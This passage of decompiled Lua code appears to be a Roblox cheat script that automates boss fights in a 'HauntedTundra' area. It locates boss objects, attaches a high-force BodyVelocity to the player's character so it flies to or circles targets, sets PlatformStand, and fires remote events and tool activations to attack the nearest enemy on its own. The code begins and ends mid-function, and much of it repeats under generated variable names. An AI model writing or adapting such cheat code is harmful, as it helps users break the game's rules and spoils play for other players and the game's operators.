                                                            if humanoid_4 ~= nil then
                                                                humanoid_4 = humanoid_4.ButtonPress
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            vaultTarget = humanoid_4
                                                            humanoid_4 = capture_1_156162.value
                                                            if humanoid_4 ~= nil then
                                                                humanoid_4 = humanoid_4.Position
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            korth_result = vaultTarget
                                                            ipairs_3 = korth_result
                                                            if korth_result then
                                                                korth_result = korth_result.GetPivot
                                                            else
                                                                korth_result = nil
                                                            end
                                                            korth_result = korth_result(ipairs_3)
                                                            if korth_result ~= nil then
                                                                korth_result = korth_result.Position
                                                            else
                                                                korth_result = nil
                                                            end
                                                            humanoid_4 = (humanoid_4) - (korth_result)
                                                            if humanoid_4 ~= nil then
                                                                humanoid_4 = humanoid_4.Magnitude
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            if (humanoid_4 <= 8.0) then
                                                                korth_result = capture_1_156174.value
                                                                ipairs_3 = health_4
                                                                korth_result(ipairs_3)
                                                                korth_result = true
                                                                capture_1_156170.value = korth_result
                                                            end
                                                        else
                                                            humanoid_4 = true
                                                            capture_1_156170.value = humanoid_4
                                                        end
                                                    else
                                                        humanoid_4 = true
                                                        capture_1_156170.value = humanoid_4
                                                    end
                                                end
                                            end
                                            humanoid_4 = capture_1_156169.value
                                            if humanoid_4 then
                                                humanoid_4 = capture_1_156170.value
                                                if humanoid_4 then
                                                    humanoid_4 = val_169
                                                    korth_result = humanoid_4
                                                    if humanoid_4 then
                                                        humanoid_4 = humanoid_4.FindFirstChild
                                                    else
                                                        humanoid_4 = nil
                                                    end
                                                    ipairs_3 = "Atticus"
                                                    humanoid_4 = humanoid_4(korth_result, ipairs_3)
                                                    if humanoid_4 then
                                                        vaultTarget = humanoid_4
                                                    end
                                                end
                                            end
                                        else
                                            korth = val_170()
                                            if (korth == "HauntedTundra") then
                                                korth = capture_1_156165.value
                                                if (korth == 11.0) then
                                                    korth = val_169
                                                    health_4 = korth
                                                    if korth then
                                                        korth = korth.FindFirstChild
                                                    else
                                                        korth = nil
                                                    end
                                                    humanoid_4 = "AkumaBossFight"
                                                    korth = korth(health_4, humanoid_4)
                                                    if korth then
                                                        vaultTarget = korth
                                                    end
                                                else
                                                    korth = val_170()
                                                    if (korth == "HauntedTundra") then
                                                        korth = capture_1_156165.value
                                                        if (korth == 17.0) then
                                                            korth = (capture_1_156168.value)()
                                                            if korth then
                                                                vaultTarget = korth
                                                            else
                                                                health_4 = workspace
                                                                humanoid_4 = health_4
                                                                health_4 = health_4.FindFirstChild
                                                                korth_result = "KoriBossFight"
                                                                health_4 = health_4(humanoid_4, korth_result)
                                                                if health_4 then
                                                                    health_4 = workspace.KoriBossFight
                                                                    humanoid_4 = health_4
                                                                    if health_4 then
                                                                        health_4 = health_4.FindFirstChild
                                                                    else
                                                                        health_4 = nil
                                                                    end
                                                                    korth_result = "StartKoriFightZone"
                                                                    health_4 = health_4(humanoid_4, korth_result)
                                                                end
                                                                if health_4 then
                                                                    vaultTarget = health_4
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            else
                                                korth = val_170()
                                                if (korth == "HauntedTundra") then
                                                    korth = capture_1_156165.value
                                                    if (korth == 17.0) then
                                                        korth = (capture_1_156168.value)()
                                                        if korth then
                                                            vaultTarget = korth
                                                        else
                                                            health_4 = workspace
                                                            humanoid_4 = health_4
                                                            health_4 = health_4.FindFirstChild
                                                            korth_result = "KoriBossFight"
                                                            health_4 = health_4(humanoid_4, korth_result)
                                                            if health_4 then
                                                                health_4 = workspace.KoriBossFight
                                                                humanoid_4 = health_4
                                                                if health_4 then
                                                                    health_4 = health_4.FindFirstChild
                                                                else
                                                                    health_4 = nil
                                                                end
                                                                korth_result = "StartKoriFightZone"
                                                                health_4 = health_4(humanoid_4, korth_result)
                                                            end
                                                            if health_4 then
                                                                vaultTarget = health_4
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    else
                                        korth = val_170()
                                        if (korth == "HauntedTundra") then
                                            korth = capture_1_156165.value
                                            if (korth == 11.0) then
                                                korth = val_169
                                                health_4 = korth
                                                if korth then
                                                    korth = korth.FindFirstChild
                                                else
                                                    korth = nil
                                                end
                                                humanoid_4 = "AkumaBossFight"
                                                korth = korth(health_4, humanoid_4)
                                                if korth then
                                                    vaultTarget = korth
                                                end
                                            else
                                                korth = val_170()
                                                if (korth == "HauntedTundra") then
                                                    korth = capture_1_156165.value
                                                    if (korth == 17.0) then
                                                        korth = (capture_1_156168.value)()
                                                        if korth then
                                                            vaultTarget = korth
                                                        else
                                                            health_4 = workspace
                                                            humanoid_4 = health_4
                                                            health_4 = health_4.FindFirstChild
                                                            korth_result = "KoriBossFight"
                                                            health_4 = health_4(humanoid_4, korth_result)
                                                            if health_4 then
                                                                health_4 = workspace.KoriBossFight
                                                                humanoid_4 = health_4
                                                                if health_4 then
                                                                    health_4 = health_4.FindFirstChild
                                                                else
                                                                    health_4 = nil
                                                                end
                                                                korth_result = "StartKoriFightZone"
                                                                health_4 = health_4(humanoid_4, korth_result)
                                                            end
                                                            if health_4 then
                                                                vaultTarget = health_4
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        else
                                            korth = val_170()
                                            if (korth == "HauntedTundra") then
                                                korth = capture_1_156165.value
                                                if (korth == 17.0) then
                                                    korth = (capture_1_156168.value)()
                                                    if korth then
                                                        vaultTarget = korth
                                                    else
                                                        health_4 = workspace
                                                        humanoid_4 = health_4
                                                        health_4 = health_4.FindFirstChild
                                                        korth_result = "KoriBossFight"
                                                        health_4 = health_4(humanoid_4, korth_result)
                                                        if health_4 then
                                                            health_4 = workspace.KoriBossFight
                                                            humanoid_4 = health_4
                                                            if health_4 then
                                                                health_4 = health_4.FindFirstChild
                                                            else
                                                                health_4 = nil
                                                            end
                                                            korth_result = "StartKoriFightZone"
                                                            health_4 = health_4(humanoid_4, korth_result)
                                                        end
                                                        if health_4 then
                                                            vaultTarget = health_4
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                                korth = vaultTarget
                                if not korth then
                                    korth = throneFlightPos
                                    if korth then
                                        korth = capture_1_156162.value
                                        health_4 = korth
                                        if korth then
                                            korth = korth.FindFirstChild
                                        else
                                            korth = nil
                                        end
                                        korth = korth(health_4, "BV")
                                        if not korth then
                                            korth = Instance.new
                                            health_4 = "BodyVelocity"
                                            korth = korth(health_4)
                                        end
                                        if korth then
                                            korth.Name = "BV"
                                        end
                                        health_4 = Vector3.new
                                        humanoid_4 = 100000.0
                                        korth_result = 100000.0
                                        ipairs_3 = 100000.0
                                        health_4 = health_4(humanoid_4, korth_result, ipairs_3)
                                        if korth then
                                            korth.MaxForce = health_4
                                        end
                                        health_4 = capture_1_156162.value
                                        if korth then
                                            korth.Parent = health_4
                                        end
                                        health_4 = nil
                                        humanoid_4 = val_170()
                                        if (humanoid_4 == "HauntedTundra") then
                                            humanoid_4 = vaultTarget
                                            korth_result = val_169
                                            ipairs_3 = korth_result
                                            if korth_result then
                                                korth_result = korth_result.FindFirstChild
                                            else
                                                korth_result = nil
                                            end
                                            name_2 = "AkumaBossFight"
                                            korth_result = korth_result(ipairs_3, name_2)
                                            if humanoid_4 ~= korth_result then
                                                humanoid_4 = false
                                            else
                                                humanoid_4 = true
                                            end
                                        else
                                            humanoid_4 = false
                                        end
                                        korth_result = vaultTarget
                                        if korth_result then
                                            korth_result = vaultTarget
                                            if korth_result ~= nil then
                                                korth_result = korth_result.Name
                                            else
                                                korth_result = nil
                                            end
                                            if (korth_result == "basehitbox") then
                                                korth_result = vaultTarget
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.Parent
                                                else
                                                    korth_result = nil
                                                end
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.Name
                                                else
                                                    korth_result = nil
                                                end
                                                if korth_result ~= "BookHand" then
                                                    korth_result = false
                                                else
                                                    korth_result = true
                                                end
                                            else
                                                korth_result = false
                                            end
                                        end
                                        ipairs_3 = val_172
                                        name_2 = throneFlightPos
                                        if name_2 then
                                            name_2 = capture_1_156176.value
                                            get_pivot_2 = throneFlightPos
                                            name_2 = name_2(get_pivot_2)
                                            health_4 = name_2
                                        else
                                            if humanoid_4 then
                                                name_2 = vaultTarget
                                                get_pivot_2 = name_2
                                                if name_2 then
                                                    name_2 = name_2.GetPivot
                                                else
                                                    name_2 = nil
                                                end
                                                name_2 = name_2(get_pivot_2)
                                                if name_2 ~= nil then
                                                    name_2 = name_2.Position
                                                else
                                                    name_2 = nil
                                                end
                                                get_pivot_2 = Vector3.new
                                                basehitbox = capture_1_156162.value
                                                if basehitbox ~= nil then
                                                    basehitbox = basehitbox.Position
                                                else
                                                    basehitbox = nil
                                                end
                                                if basehitbox ~= nil then
                                                    basehitbox = basehitbox.X
                                                else
                                                    basehitbox = nil
                                                end
                                                ipairs_4 = 0.0
                                                name_3 = capture_1_156162.value
                                                if name_3 ~= nil then
                                                    name_3 = name_3.Position
                                                else
                                                    name_3 = nil
                                                end
                                                if name_3 ~= nil then
                                                    name_3 = name_3.Z
                                                else
                                                    name_3 = nil
                                                end
                                                get_pivot_2 = get_pivot_2(basehitbox, ipairs_4, name_3)
                                                basehitbox = Vector3.new
                                                if name_2 ~= nil then
                                                    ipairs_4 = name_2.X
                                                else
                                                    ipairs_4 = nil
                                                end
                                                name_3 = 0.0
                                                if name_2 ~= nil then
                                                    get_pivot_3 = name_2.Z
                                                else
                                                    get_pivot_3 = nil
                                                end
                                                basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                get_pivot_2 = (get_pivot_2) - (basehitbox)
                                                if get_pivot_2 ~= nil then
                                                    get_pivot_2 = get_pivot_2.Magnitude
                                                else
                                                    get_pivot_2 = nil
                                                end
                                                if (30.0 < get_pivot_2) then
                                                    basehitbox = capture_1_156176.value
                                                    ipairs_4 = Vector3.new
                                                    name_3 = 0.0
                                                    get_pivot_3 = 5.0
                                                    ipairs_4_result = 0.0
                                                    ipairs_4 = ipairs_4(name_3, get_pivot_3, ipairs_4_result)
                                                    ipairs_4 = (name_2) + (ipairs_4)
                                                    basehitbox = basehitbox(ipairs_4)
                                                    health_4 = basehitbox
                                                else
                                                    basehitbox = (tick()) * (12.0)
                                                    ipairs_4 = 12.0
                                                    name_3 = 22.0
                                                    get_pivot_3 = Vector3.new
                                                    ipairs_4_result = math
                                                    if ipairs_4_result ~= nil then
                                                        ipairs_4_result = ipairs_4_result.cos
                                                    else
                                                        ipairs_4_result = nil
                                                    end
                                                    ipairs_4_result = (ipairs_4_result(basehitbox)) * (ipairs_4)
                                                    val_180 = name_3
                                                    magnitude = math
                                                    if magnitude ~= nil then
                                                        magnitude = magnitude.sin
                                                    else
                                                        magnitude = nil
                                                    end
                                                    val_181 = basehitbox
                                                    magnitude = (magnitude(val_181)) * (ipairs_4)
                                                    get_pivot_3 = get_pivot_3(ipairs_4_result, val_180, magnitude)
                                                    health_4 = (name_2) + (get_pivot_3)
                                                    ipairs_3 = 120.0
                                                end
                                            else
                                                if korth_result then
                                                    name_2 = capture_1_156176.value
                                                    get_pivot_2 = vaultTarget
                                                    basehitbox = get_pivot_2
                                                    if get_pivot_2 then
                                                        get_pivot_2 = get_pivot_2.GetPivot
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    get_pivot_2 = get_pivot_2(basehitbox)
                                                    if get_pivot_2 ~= nil then
                                                        get_pivot_2 = get_pivot_2.Position
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    name_2 = name_2(get_pivot_2)
                                                    health_4 = name_2
                                                else
                                                    name_2 = capture_1_156176.value
                                                    get_pivot_2 = vaultTarget
                                                    basehitbox = get_pivot_2
                                                    if get_pivot_2 then
                                                        get_pivot_2 = get_pivot_2.GetPivot
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    get_pivot_2 = get_pivot_2(basehitbox)
                                                    if get_pivot_2 ~= nil then
                                                        get_pivot_2 = get_pivot_2.Position
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    basehitbox = Vector3.new
                                                    ipairs_4 = 0.0
                                                    name_3 = 5.0
                                                    get_pivot_3 = 0.0
                                                    basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                    get_pivot_2 = (get_pivot_2) + (basehitbox)
                                                    name_2 = name_2(get_pivot_2)
                                                    health_4 = name_2
                                                end
                                            end
                                        end
                                        name_2 = capture_1_156162.value
                                        if name_2 ~= nil then
                                            name_2 = name_2.Position
                                        else
                                            name_2 = nil
                                        end
                                        name_2 = (health_4) - (name_2)
                                        if name_2 ~= nil then
                                            name_2 = name_2.Unit
                                        else
                                            name_2 = nil
                                        end
                                        get_pivot_2 = capture_1_156162.value
                                        if get_pivot_2 ~= nil then
                                            get_pivot_2 = get_pivot_2.Position
                                        else
                                            get_pivot_2 = nil
                                        end
                                        get_pivot_2 = (health_4) - (get_pivot_2)
                                        if get_pivot_2 ~= nil then
                                            get_pivot_2 = get_pivot_2.Magnitude
                                        else
                                            get_pivot_2 = nil
                                        end
                                        if (2.0 < get_pivot_2) then
                                            basehitbox = (name_2) * (ipairs_3)
                                            if korth then
                                                korth.Velocity = basehitbox
                                            end
                                        else
                                            basehitbox = Vector3.zero
                                            if korth then
                                                korth.Velocity = basehitbox
                                            end
                                        end
                                        basehitbox = capture_1_156163.value
                                        if basehitbox then
                                            basehitbox.PlatformStand = true
                                        end
                                        if korth_result then
                                            basehitbox = pcall
                                            local capture_77_186113_2, capture_77_186114_2 = val_173, val_174
                                            ipairs_4 = function()
                                                local activate_3, tool_5
                                                local fire_server_11 = capture_77_186113_2.value
                                                if fire_server_11 then
                                                    fire_server_11 = capture_77_186113_2.value
                                                    activate_3 = fire_server_11
                                                    if fire_server_11 then
                                                        fire_server_11 = fire_server_11.FireServer
                                                    else
                                                        fire_server_11 = nil
                                                    end
                                                    fire_server_11(activate_3)
                                                end
                                                fire_server_11 = capture_77_186114_2.value
                                                if fire_server_11 then
                                                    fire_server_11 = capture_77_186114_2.value
                                                    activate_3 = fire_server_11
                                                    if fire_server_11 then
                                                        fire_server_11 = fire_server_11.FindFirstChildOfClass
                                                    else
                                                        fire_server_11 = nil
                                                    end
                                                    tool_5 = "Tool"
                                                    fire_server_11 = fire_server_11(activate_3, tool_5)
                                                end
                                                if fire_server_11 then
                                                    tool_5 = fire_server_11
                                                    if fire_server_11 then
                                                        activate_3 = fire_server_11.Activate
                                                    else
                                                        activate_3 = nil
                                                    end
                                                    activate_3(tool_5)
                                                end
                                                return
                                            end
                                            basehitbox(ipairs_4)
                                        else
                                            basehitbox = vaultTarget
                                            if basehitbox then
                                                basehitbox = vaultTarget
                                                ipairs_4 = basehitbox
                                                if basehitbox then
                                                    basehitbox = basehitbox.FindFirstChildOfClass
                                                else
                                                    basehitbox = nil
                                                end
                                                name_3 = "Humanoid"
                                                basehitbox = basehitbox(ipairs_4, name_3)
                                                if basehitbox then
                                                    basehitbox = val_175
                                                    basehitbox()
                                                end
                                            end
                                        end
                                    else
                                        if value_19 then
                                            korth = val_176(value_19)
                                            health_4 = #(korth)
                                            if (health_4 == 0.0) then
                                                health_4 = (capture_1_156181.value)(value_19)
                                                humanoid_4 = val_177
                                                korth_result = health_4
                                                humanoid_4 = humanoid_4(korth_result)
                                                korth = humanoid_4
                                            end
                                            health_4 = capture_1_156162.value
                                            humanoid_4 = health_4
                                            if health_4 then
                                                health_4 = health_4.FindFirstChild
                                            else
                                                health_4 = nil
                                            end
                                            health_4 = health_4(humanoid_4, "BV")
                                            if not health_4 then
                                                health_4 = Instance.new
                                                humanoid_4 = "BodyVelocity"
                                                health_4 = health_4(humanoid_4)
                                            end
                                            if health_4 then
                                                health_4.Name = "BV"
                                            end
                                            humanoid_4 = Vector3.new
                                            korth_result = 100000.0
                                            ipairs_3 = 100000.0
                                            name_2 = 100000.0
                                            humanoid_4 = humanoid_4(korth_result, ipairs_3, name_2)
                                            if health_4 then
                                                health_4.MaxForce = humanoid_4
                                            end
                                            humanoid_4 = capture_1_156162.value
                                            if health_4 then
                                                health_4.Parent = humanoid_4
                                            end
                                            humanoid_4 = #(korth)
                                            if (0.0 < humanoid_4) then
                                                humanoid_4 = nil
                                                korth_result = math
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.huge
                                                else
                                                    korth_result = nil
                                                end
                                                ipairs_3 = pairs
                                                name_2 = korth
                                                ipairs_3 = ipairs_3(name_2)
                                                while true do
                                                    basehitbox = ipairs_3(name_2, get_pivot_2)
                                                    if basehitbox ~= nil then
                                                        get_pivot_2 = basehitbox
                                                        get_pivot_3 = ipairs_4
                                                        if ipairs_4 then
                                                            name_3 = ipairs_4.FindFirstChild
                                                        else
                                                            name_3 = nil
                                                        end
                                                        ipairs_4_result = "HumanoidRootPart"
                                                        name_3 = name_3(get_pivot_3, ipairs_4_result)
                                                        if name_3 then
                                                            get_pivot_3 = capture_1_156162.value
                                                            if get_pivot_3 ~= nil then
                                                                get_pivot_3 = get_pivot_3.Position
                                                            else
                                                                get_pivot_3 = nil
                                                            end
                                                            if name_3 ~= nil then
                                                                ipairs_4_result = name_3.Position
                                                            else
                                                                ipairs_4_result = nil
                                                            end
                                                            get_pivot_3 = (get_pivot_3) - (ipairs_4_result)
                                                            if get_pivot_3 ~= nil then
                                                                get_pivot_3 = get_pivot_3.Magnitude
                                                            else
                                                                get_pivot_3 = nil
                                                            end
                                                            if (get_pivot_3 < korth_result) then
                                                                korth_result = get_pivot_3
                                                                humanoid_4 = ipairs_4
                                                            end
                                                        end
                                                    else
                                                        break
                                                    end
                                                end
                                                if humanoid_4 then
                                                    name_2 = humanoid_4
                                                    if humanoid_4 then
                                                        ipairs_3 = humanoid_4.FindFirstChild
                                                    else
                                                        ipairs_3 = nil
                                                    end
                                                    get_pivot_2 = "HumanoidRootPart"
                                                    ipairs_3 = ipairs_3(name_2, get_pivot_2)
                                                    if ipairs_3 then
                                                        name_2 = capture_1_156176.value
                                                        if ipairs_3 ~= nil then
                                                            get_pivot_2 = ipairs_3.Position
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        basehitbox = Vector3.new
                                                        ipairs_4 = 0.0
                                                        name_3 = 10.0
                                                        get_pivot_3 = 0.0
                                                        basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                        name_2 = name_2((get_pivot_2) + (basehitbox))
                                                        get_pivot_2 = capture_1_156162.value
                                                        if get_pivot_2 ~= nil then
                                                            get_pivot_2 = get_pivot_2.Position
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        get_pivot_2 = (name_2) - (get_pivot_2)
                                                        if get_pivot_2 ~= nil then
                                                            get_pivot_2 = get_pivot_2.Magnitude
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        if (2.0 < get_pivot_2) then
                                                            basehitbox = capture_1_156162.value
                                                            if basehitbox ~= nil then
                                                                basehitbox = basehitbox.Position
                                                            else
                                                                basehitbox = nil
                                                            end
                                                            basehitbox = (name_2) - (basehitbox)
                                                            if basehitbox ~= nil then
                                                                basehitbox = basehitbox.Unit
                                                            else
                                                                basehitbox = nil
                                                            end
                                                            ipairs_4 = val_172
                                                            ipairs_4 = (basehitbox) * (ipairs_4)
                                                            if health_4 then
                                                                health_4.Velocity = ipairs_4
                                                            end
                                                        else
                                                            basehitbox = Vector3.zero
                                                            if health_4 then
                                                                health_4.Velocity = basehitbox
                                                            end
                                                        end
                                                        basehitbox = capture_1_156163.value
                                                        if basehitbox then
                                                            basehitbox.PlatformStand = true
                                                        end
                                                    end
                                                end
                                                ipairs_3 = val_175
                                                ipairs_3()
                                            else
                                                humanoid_4 = capture_1_156176.value
                                                ipairs_3 = value_19
                                                if value_19 then
                                                    korth_result = value_19.GetPivot
                                                else
                                                    korth_result = nil
                                                end
                                                korth_result = korth_result(ipairs_3)
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.Position
                                                else
                                                    korth_result = nil
                                                end
                                                ipairs_3 = Vector3.new
                                                name_2 = 0.0
                                                get_pivot_2 = 10.0
                                                basehitbox = 0.0
                                                ipairs_3 = ipairs_3(name_2, get_pivot_2, basehitbox)
                                                humanoid_4 = humanoid_4((korth_result) + (ipairs_3))
                                                korth_result = capture_1_156162.value
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.Position
                                                else
                                                    korth_result = nil
                                                end
                                                korth_result = (korth_result) - (humanoid_4)
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.Magnitude
                                                else
                                                    korth_result = nil
                                                end
                                                if (5.0 < korth_result) then
                                                    ipairs_3 = capture_1_156162.value
                                                    if ipairs_3 ~= nil then
                                                        ipairs_3 = ipairs_3.Position
                                                    else
                                                        ipairs_3 = nil
                                                    end
                                                    ipairs_3 = (humanoid_4) - (ipairs_3)
                                                    if ipairs_3 ~= nil then
                                                        ipairs_3 = ipairs_3.Unit
                                                    else
                                                        ipairs_3 = nil
                                                    end
                                                    name_2 = val_172
                                                    name_2 = (ipairs_3) * (name_2)
                                                    if health_4 then
                                                        health_4.Velocity = name_2
                                                    end
                                                    name_2 = capture_1_156163.value
                                                    if name_2 then
                                                        name_2.PlatformStand = true
                                                    end
                                                else
                                                    ipairs_3 = Vector3.zero
                                                    if health_4 then
                                                        health_4.Velocity = ipairs_3
                                                    end
                                                end
                                            end
                                        else
                                            korth = val_177
                                            health_4 = math
                                            if health_4 ~= nil then
                                                health_4 = health_4.huge
                                            else
                                                health_4 = nil
                                            end
                                            korth = korth(health_4)
                                            health_4 = #(korth)
                                            if (0.0 < health_4) then
                                                health_4 = nil
                                                humanoid_4 = math
                                                if humanoid_4 ~= nil then
                                                    humanoid_4 = humanoid_4.huge
                                                else
                                                    humanoid_4 = nil
                                                end
                                                korth_result = pairs
                                                ipairs_3 = korth
                                                korth_result = korth_result(ipairs_3)
                                                while true do
                                                    get_pivot_2 = korth_result(ipairs_3, name_2)
                                                    if get_pivot_2 ~= nil then
                                                        name_2 = get_pivot_2
                                                        name_3 = basehitbox
                                                        if basehitbox then
                                                            ipairs_4 = basehitbox.FindFirstChild
                                                        else
                                                            ipairs_4 = nil
                                                        end
                                                        get_pivot_3 = "HumanoidRootPart"
                                                        ipairs_4 = ipairs_4(name_3, get_pivot_3)
                                                        if ipairs_4 then
                                                            name_3 = capture_1_156162.value
                                                            if name_3 ~= nil then
                                                                name_3 = name_3.Position
                                                            else
                                                                name_3 = nil
                                                            end
                                                            if ipairs_4 ~= nil then
                                                                get_pivot_3 = ipairs_4.Position
                                                            else
                                                                get_pivot_3 = nil
                                                            end
                                                            name_3 = (name_3) - (get_pivot_3)
                                                            if name_3 ~= nil then
                                                                name_3 = name_3.Magnitude
                                                            else
                                                                name_3 = nil
                                                            end
                                                            if (name_3 < humanoid_4) then
                                                                humanoid_4 = name_3
                                                                health_4 = basehitbox
                                                            end
                                                        end
                                                    else
                                                        break
                                                    end
                                                end
                                                korth_result = capture_1_156162.value
                                                ipairs_3 = korth_result
                                                if korth_result then
                                                    korth_result = korth_result.FindFirstChild
                                                else
                                                    korth_result = nil
                                                end
                                                korth_result = korth_result(ipairs_3, "BV")
                                                if not korth_result then
                                                    korth_result = Instance.new
                                                    ipairs_3 = "BodyVelocity"
                                                    korth_result = korth_result(ipairs_3)
                                                end
                                                if korth_result then
                                                    korth_result.Name = "BV"
                                                end
                                                ipairs_3 = Vector3.new
                                                name_2 = 100000.0
                                                get_pivot_2 = 100000.0
                                                basehitbox = 100000.0
                                                ipairs_3 = ipairs_3(name_2, get_pivot_2, basehitbox)
                                                if korth_result then
                                                    korth_result.MaxForce = ipairs_3
                                                end
                                                ipairs_3 = capture_1_156162.value
                                                if korth_result then
                                                    korth_result.Parent = ipairs_3
                                                end
                                                if health_4 then
                                                    name_2 = health_4
                                                    if health_4 then
                                                        ipairs_3 = health_4.FindFirstChild
                                                    else
                                                        ipairs_3 = nil
                                                    end
                                                    get_pivot_2 = "HumanoidRootPart"
                                                    ipairs_3 = ipairs_3(name_2, get_pivot_2)
                                                    if ipairs_3 then
                                                        name_2 = capture_1_156176.value
                                                        if ipairs_3 ~= nil then
                                                            get_pivot_2 = ipairs_3.Position
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        basehitbox = Vector3.new
                                                        ipairs_4 = 0.0
                                                        name_3 = 10.0
                                                        get_pivot_3 = 0.0
                                                        basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                        name_2 = name_2((get_pivot_2) + (basehitbox))
                                                        get_pivot_2 = capture_1_156162.value
                                                        if get_pivot_2 ~= nil then
                                                            get_pivot_2 = get_pivot_2.Position
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        get_pivot_2 = (name_2) - (get_pivot_2)
                                                        if get_pivot_2 ~= nil then
                                                            get_pivot_2 = get_pivot_2.Magnitude
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        if (2.0 < get_pivot_2) then
                                                            basehitbox = capture_1_156162.value
                                                            if basehitbox ~= nil then
                                                                basehitbox = basehitbox.Position
                                                            else
                                                                basehitbox = nil
                                                            end
                                                            basehitbox = (name_2) - (basehitbox)
                                                            if basehitbox ~= nil then
                                                                basehitbox = basehitbox.Unit
                                                            else
                                                                basehitbox = nil
                                                            end
                                                            ipairs_4 = val_172
                                                            ipairs_4 = (basehitbox) * (ipairs_4)
                                                            if korth_result then
                                                                korth_result.Velocity = ipairs_4
                                                            end
                                                        else
                                                            basehitbox = Vector3.zero
                                                            if korth_result then
                                                                korth_result.Velocity = basehitbox
                                                            end
                                                        end
                                                        basehitbox = capture_1_156163.value
                                                        if basehitbox then
                                                            basehitbox.PlatformStand = true
                                                        end
                                                    end
                                                else
                                                    ipairs_3 = Vector3.zero
                                                    if korth_result then
                                                        korth_result.Velocity = ipairs_3
                                                    end
                                                end
                                                ipairs_3 = val_175
                                                ipairs_3()
                                            else
                                                health_4 = capture_1_156162.value
                                                if health_4 then
                                                    health_4 = capture_1_156162.value
                                                    humanoid_4 = health_4
                                                    if health_4 then
                                                        health_4 = health_4.FindFirstChild
                                                    else
                                                        health_4 = nil
                                                    end
                                                    korth_result = "BV"
                                                    health_4 = health_4(humanoid_4, korth_result)
                                                    if health_4 then
                                                        korth_result = health_4
                                                        if health_4 then
                                                            humanoid_4 = health_4.Destroy
                                                        else
                                                            humanoid_4 = nil
                                                        end
                                                        humanoid_4(korth_result)
                                                    end
                                                end
                                                health_4 = capture_1_156163.value
                                                if health_4 then
                                                    health_4 = capture_1_156163.value
                                                    if health_4 then
                                                        health_4.PlatformStand = false
                                                    end
                                                end
                                            end
                                        end
                                    end
                                else
                                    korth = capture_1_156162.value
                                    health_4 = korth
                                    if korth then
                                        korth = korth.FindFirstChild
                                    else
                                        korth = nil
                                    end
                                    korth = korth(health_4, "BV")
                                    if not korth then
                                        korth = Instance.new
                                        health_4 = "BodyVelocity"
                                        korth = korth(health_4)
                                    end
                                    if korth then
                                        korth.Name = "BV"
                                    end
                                    health_4 = Vector3.new
                                    humanoid_4 = 100000.0
                                    korth_result = 100000.0
                                    ipairs_3 = 100000.0
                                    health_4 = health_4(humanoid_4, korth_result, ipairs_3)
                                    if korth then
                                        korth.MaxForce = health_4
                                    end
                                    health_4 = capture_1_156162.value
                                    if korth then
                                        korth.Parent = health_4
                                    end
                                    health_4 = nil
                                    humanoid_4 = val_170()
                                    if (humanoid_4 == "HauntedTundra") then
                                        humanoid_4 = vaultTarget
                                        korth_result = val_169
                                        ipairs_3 = korth_result
                                        if korth_result then
                                            korth_result = korth_result.FindFirstChild
                                        else
                                            korth_result = nil
                                        end
                                        name_2 = "AkumaBossFight"
                                        korth_result = korth_result(ipairs_3, name_2)
                                        if humanoid_4 ~= korth_result then
                                            humanoid_4 = false
                                        else
                                            humanoid_4 = true
                                        end
                                    else
                                        humanoid_4 = false
                                    end
                                    korth_result = vaultTarget
                                    if korth_result then
                                        korth_result = vaultTarget
                                        if korth_result ~= nil then
                                            korth_result = korth_result.Name
                                        else
                                            korth_result = nil
                                        end
                                        if (korth_result == "basehitbox") then
                                            korth_result = vaultTarget
                                            if korth_result ~= nil then
                                                korth_result = korth_result.Parent
                                            else
                                                korth_result = nil
                                            end
                                            if korth_result ~= nil then
                                                korth_result = korth_result.Name
                                            else
                                                korth_result = nil
                                            end
                                            if korth_result ~= "BookHand" then
                                                korth_result = false
                                            else
                                                korth_result = true
                                            end
                                        else
                                            korth_result = false
                                        end
                                    end
                                    ipairs_3 = val_172
                                    name_2 = throneFlightPos
                                    if name_2 then
                                        name_2 = capture_1_156176.value
                                        get_pivot_2 = throneFlightPos
                                        name_2 = name_2(get_pivot_2)
                                        health_4 = name_2
                                    else
                                        if humanoid_4 then
                                            name_2 = vaultTarget
                                            get_pivot_2 = name_2
                                            if name_2 then
                                                name_2 = name_2.GetPivot
                                            else
                                                name_2 = nil
                                            end
                                            name_2 = name_2(get_pivot_2)
                                            if name_2 ~= nil then
                                                name_2 = name_2.Position
                                            else
                                                name_2 = nil
                                            end
                                            get_pivot_2 = Vector3.new
                                            basehitbox = capture_1_156162.value
                                            if basehitbox ~= nil then
                                                basehitbox = basehitbox.Position
                                            else
                                                basehitbox = nil
                                            end
                                            if basehitbox ~= nil then
                                                basehitbox = basehitbox.X
                                            else
                                                basehitbox = nil
                                            end
                                            ipairs_4 = 0.0
                                            name_3 = capture_1_156162.value
                                            if name_3 ~= nil then
                                                name_3 = name_3.Position
                                            else
                                                name_3 = nil
                                            end
                                            if name_3 ~= nil then
                                                name_3 = name_3.Z
                                            else
                                                name_3 = nil
                                            end
                                            get_pivot_2 = get_pivot_2(basehitbox, ipairs_4, name_3)
                                            basehitbox = Vector3.new
                                            if name_2 ~= nil then
                                                ipairs_4 = name_2.X
                                            else
